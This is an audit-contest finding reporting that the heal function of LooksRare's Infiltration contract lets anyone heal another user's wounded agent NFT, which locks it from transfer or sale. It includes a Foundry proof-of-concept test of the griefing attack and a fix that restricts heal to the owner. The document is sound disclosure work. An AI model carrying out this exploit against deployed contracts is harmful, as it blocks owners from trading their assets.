Polite Rose Beaver

medium

# heal - attacker can request heal to stop other users from trading NFTs
## Summary

Only active, wounded agents can be transferred. Since anyone can request heal the wounded agent owned by another user, attacker can prevent user sell(transfer) agent NFT.

## Vulnerability Detail

The `heal` function allows anyone to request to heal the wounded agent that they do not own. Only active or wounded agents can be transferred, not healing, escaped, or dead agents.

```solidity
function transferFrom(address from, address to, uint256 tokenId) public payable override {
    AgentStatus status = agents[agentIndex(tokenId)].status;
@>  if (status > AgentStatus.Wounded) {
        revert InvalidAgentStatus(tokenId, status);
    }
    super.transferFrom(from, to, tokenId);
}
```

 

Users can freely buy and sell agent NFTs on the NFT market. However, if the attacker requests to heal the wounded agent that is selling, the user will not be able to trade agent NFT.

This is the PoC code. Anyone can request to heal the agent, and this agent is no longer transferable.

```solidity
function test_poc_heal_others() public {
    _startGameAndDrawOneRound();

    _drawXRounds(1);
    
    address attacker = address(0xcafebabe);

    (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: 1});

    assertEq(infiltration.costToHeal(woundedAgentIds), HEAL_BASE_COST * woundedAgentIds.length);

    address agentOwner = _ownerOf(woundedAgentIds[0]);

    looks.mint(attacker, HEAL_BASE_COST);

    // attacker calls heal
    vm.startPrank(attacker);
    _grantLooksApprovals();
    looks.approve(TRANSFER_MANAGER, HEAL_BASE_COST);

    uint256[] memory agentIds = new uint256[](1);
    agentIds[0] = woundedAgentIds[0];

    uint256[] memory costs = new uint256[](1);
    costs[0] = HEAL_BASE_COST;

    expectEmitCheckAll();
    emit HealRequestSubmitted(3, agentIds, costs);

    infiltration.heal(agentIds);
    vm.stopPrank();

    (, uint256[] memory healingAgentIds) = infiltration.getRoundInfo({roundId: 1});
    assertAgentIdsAreHealing(healingAgentIds);

    vm.expectRevert(
        abi.encodePacked(
            IInfiltration.InvalidAgentStatus.selector,
            abi.encode(woundedAgentIds[0], IInfiltration.AgentStatus.Healing)
        )
    );

    vm.prank(agentOwner); // NFT owner fail to sell/transfer NFT
    infiltration.transferFrom(agentOwner, address(0x1234), woundedAgentIds[0]);

}
```

## Impact

## Code Snippet

[https://github.com/sherlock-audit/2023-10-looksrare/blob/86e8a3a6d7880af0dc2ca03bf3eb31bc0a10a552/contracts-infiltration/contracts/Infiltration.sol#L801](https://github.com/sherlock-audit/2023-10-looksrare/blob/86e8a3a6d7880af0dc2ca03bf3eb31bc0a10a552/contracts-infiltration/contracts/Infiltration.sol#L801)

[https://github.com/sherlock-audit/2023-10-looksrare/blob/86e8a3a6d7880af0dc2ca03bf3eb31bc0a10a552/contracts-infiltration/contracts/Infiltration.sol#L925-L928](https://github.com/sherlock-audit/2023-10-looksrare/blob/86e8a3a6d7880af0dc2ca03bf3eb31bc0a10a552/contracts-infiltration/contracts/Infiltration.sol#L925-L928)

## Tool used

Manual Review

## Recommendation

Make sure that only the agent owner can request to heal. If `heal` is called from InfiltrationPeriphery contract, pass `msg.sender` as parameter and check it.